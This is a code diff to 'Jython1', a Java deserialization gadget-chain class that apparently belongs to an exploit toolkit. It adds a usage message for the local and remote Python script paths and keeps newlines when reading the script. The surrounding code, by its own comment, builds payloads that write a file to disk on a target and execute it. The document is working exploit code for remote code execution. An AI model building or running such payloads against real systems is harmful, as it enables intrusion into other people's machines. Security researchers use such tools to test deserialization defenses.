@@ -53,7 +53,7 @@ public class Jython1 extends GadgetChain<CompareTrampoline> {
     protected TrampolineConnector createPayload(String command) throws Exception {
         String[] paths = command.split(";");
         if (paths.length != 2) {
-            throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(paths));
+            throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(paths) + "\n" + "Usage: <local_python_script_location>;<remote_python_script_location>");
         }
 
         // Set payload parameters
@@ -63,7 +63,7 @@ public class Jython1 extends GadgetChain<CompareTrampoline> {
         while (true) {
             String line = reader.readLine();
             if (line == null) break;
-            python_code.append(line);
+            python_code.append(line).append("\n");
         }
 
         // Python bytecode to write a file on disk and execute it
